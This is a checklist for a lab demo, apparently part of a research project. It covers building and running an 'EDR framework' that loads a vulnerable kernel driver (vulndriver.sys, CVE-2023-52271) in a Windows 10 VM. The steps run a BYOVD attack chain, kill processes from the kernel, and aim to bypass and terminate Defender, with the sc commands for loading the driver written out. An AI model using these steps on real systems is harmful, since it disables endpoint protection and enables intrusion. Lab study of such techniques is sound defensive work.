# QUICK TESTING CHECKLIST - Windows 10 VM
**Print this or keep it open during testing!**

---

## ☑️ PHASE 1: SETUP (One-time)

```
□ VM booted - Test Mode watermark visible
□ Administrator CMD opened (right-click → Run as admin)
□ Run: net session  (should succeed)
□ Visual Studio 2022 installed (45 min if new)
□ Files transferred to C:\EDR-Framework\
□ Driver verified: dir C:\EDR-Framework\vulndriver.sys (38,816 bytes)
```

---

## ☑️ PHASE 2: BUILD (5 minutes)

```
□ Open "Developer Command Prompt for VS 2022" AS ADMINISTRATOR
□ cd C:\EDR-Framework
□ Run: build_windows.bat
□ Build succeeds - Binary at: build\bin\Release\edr_framework.exe
```

---

## ☑️ PHASE 3: MANUAL DRIVER TEST (5 minutes)

```
□ mkdir C:\EDR-Test
□ copy vulndriver.sys C:\EDR-Test\
□ sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"
□ sc start WarsawPMTest
□ Verify: STATE : 4 RUNNING ✅
□ Cleanup: sc stop WarsawPMTest && sc delete WarsawPMTest
```

---

## ☑️ PHASE 4: FRAMEWORK TEST (10 minutes)

```
□ cd C:\EDR-Framework\build\bin\Release
□ copy ..\..\..\..\vulndriver.sys C:\EDR-Test\
□ Run: edr_framework.exe
□ Select technique: 1
□ Driver path: [Press Enter for default]
□ Target PID: [Press Enter for test mode]
□ All 6 steps complete successfully ✅
□ "BYOVD ATTACK SUCCESSFUL!" message shown
□ Cleanup confirms service deleted
```

---

## ☑️ PHASE 5: PROCESS TERMINATION TEST (5 minutes)

```
□ Open new terminal: start notepad.exe
□ Get PID: tasklist | findstr notepad.exe  (note the number)
□ Run: edr_framework.exe
□ Enter noted PID when prompted
□ Verify: tasklist | findstr notepad.exe  (should be empty) ✅
```

---

## ☑️ PHASE 6: DEMO PREP (10 minutes)

```
□ Screenshot: Test Mode watermark
□ Screenshot: Framework successful execution
□ Screenshot: Process termination proof
□ Record demo video (Win + G → Record)
□ Create VM snapshot: "Demo-Ready"
□ Test presentation slides load correctly
```

---

## 🚨 EMERGENCY RECOVERY

**If anything breaks:**

```bash
# On Linux host terminal
VBoxManage controlvm "windows10" poweroff
VBoxManage snapshot "windows10" restore "Clean-Baseline"
VBoxManage startvm "windows10"
```

**Then restart from Phase 2 (build already done if you snapshot after build)**

---

## ✅ SUCCESS CRITERIA FOR THURSDAY

**MUST HAVE (Minimum Demo):**
```
✅ Driver loads (manual test passes)
✅ Framework executes without errors
✅ All 6 attack steps complete
✅ "SUCCESSFUL" message displayed
✅ Can explain each step
```

**SHOULD HAVE (Strong Demo):**
```
✅ Process termination works (Notepad killed)
✅ Screenshots of execution
✅ Timing: < 2 seconds total
✅ Presentation slides ready
```

**NICE TO HAVE (Impressive Demo):**
```
✅ Video backup recorded
✅ Tested against Defender (bypassed)
✅ Defender process terminated
✅ Event logs showing kernel driver load
```

---

## 📊 TIMING BENCHMARKS

| Task | Expected Time | Your Time |
|------|---------------|-----------|
| Driver load | < 2 sec | _____ |
| Full exploit | < 2 sec | _____ |
| Process kill | < 50 ms | _____ |
| Cleanup | < 1 sec | _____ |

---

## 🎯 DEMO DAY SCRIPT

**Opening (30 sec):**
```
"I'll demonstrate CVE-2023-52271 exploitation using vulndriver.sys,
which is NOT on Microsoft's blocklist. This provides kernel-level
process termination via ZwTerminateProcess."
```

**Show (2 min):**
```
1. Run edr_framework.exe
2. Watch 6-step attack chain
3. Show successful message
4. Terminate test process
5. Verify termination
```

**Closing (30 sec):**
```
"Total time: under 2 seconds. Next steps: PPL Bypass, Direct Syscalls,
DLL Side-Loading over the next 4 months."
```

---

## 📞 QUICK COMMANDS

**Check admin:**
```cmd
net session
```

**Build:**
```cmd
cd C:\EDR-Framework && build_windows.bat
```

**Quick test:**
```cmd
sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"
sc start WarsawPMTest
sc query WarsawPMTest
sc stop WarsawPMTest && sc delete WarsawPMTest
```

**Run framework:**
```cmd
cd C:\EDR-Framework\build\bin\Release
edr_framework.exe
```

**Get process PID:**
```cmd
tasklist | findstr notepad.exe
```

---

**GOOD LUCK! 🚀**
